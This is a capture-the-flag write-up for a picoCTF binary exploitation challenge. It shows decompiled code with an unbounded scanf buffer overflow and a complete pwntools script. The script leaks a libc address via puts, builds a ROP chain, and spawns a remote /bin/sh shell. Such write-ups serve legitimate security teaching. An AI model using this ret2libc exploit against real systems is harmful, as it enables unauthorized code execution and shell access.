# Write-up of the challenge "Here's a LIBC"

This challenge is part of the "Binary exploitation" category and is in the hard category.

# Goal of the challenge

The objective you just write something and the services echoes it back.

## Program structure

```c

int64_t do_stuff()
{
    int64_t var_18 = 0;
    char str[0x70];
    __isoc99_scanf("%[^\n]", &str);
    void var_89;
    __isoc99_scanf("%c", &var_89);
    
    for (int64_t i = 0; i <= 0x63; i += 1)
        str[i] = convert_case(str[i], i);
    
    return puts(&str);
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    int32_t argc_1 = argc;
    char** argv_1 = argv;
    setbuf(__TMC_END__, nullptr);
    gid_t rax = getegid();
    setresgid(rax, rax, rax);
    int64_t var_40 = 0x1b;
    int64_t var_78;
    __builtin_strncpy(&var_78, "Welcome to my echo server!", 0x1b);
    int64_t var_48 = var_40 - 1;
    char* str = &argv_1 - COMBINE(0, var_40 + 0xf) / 0x10 * 0x10;
    
    for (void* i = nullptr; i < var_40; i += 1)
        *(i + str) = convert_case(*(i + &var_78), i);
    
    puts(str);
    
    while (true)
        do_stuff();
}


```

## Problem

When I first tried the service and I saw it echoes back what I said I immediately thought about **"format string attack"** even before decompiling the binary. Turns out that wasn't the case. When I decompiled the binary I realized that we needed to do basically ret2libc.

## Security breach

It doesn't do any size check so we can basically just buffer overflow. 
```c
 __isoc99_scanf("%[^\n]", &str);
  void var_89;
  __isoc99_scanf("%c", &var_89);
```

## Solution

So what I did basically leak the **"puts_got"** using **"puts_plt"** from the binary. Then return to **"main"** after. Because we have the **"puts_got"** we can subtract it from the **"symbol puts"** from the libc and find the base. By doing that we can now do basic ROP and execute **"system(binish)"**. I found the **"$RIP"** by doing **"cylic pattern"**.

```python
from pwn import *

# p = process('./vuln')
p = remote('wily-courier.picoctf.net', 56209)
elf = ELF('vuln')
libc_elf = ELF('libc.so.6')

rop = ROP(elf)

rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']

payload = b'A' * 136


payload += p64(ret) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(ret) + p64(main)

p.sendline(payload)



for i in range(0, 2):
    out = p.recvline()
    print(i, out)


leak_line = p.recvline()

print('leak_line',leak_line)

raw  = leak_line.rstrip(b'\n')
raw  = raw.ljust(8, b'\x00')
leak = u64(raw)


base = int(leak) - libc_elf.sym['puts']

libc_elf.address = base

system = libc_elf.symbols['system']
binish = next(libc_elf.search(b'/bin/sh'))


payload_2 = b'A' * 136 + p64(ret) + p64(rdi)  + p64(binish) + p64(system)

p.sendline(payload_2)


p.interactive()


```

If you liked this writeup you can star my repository.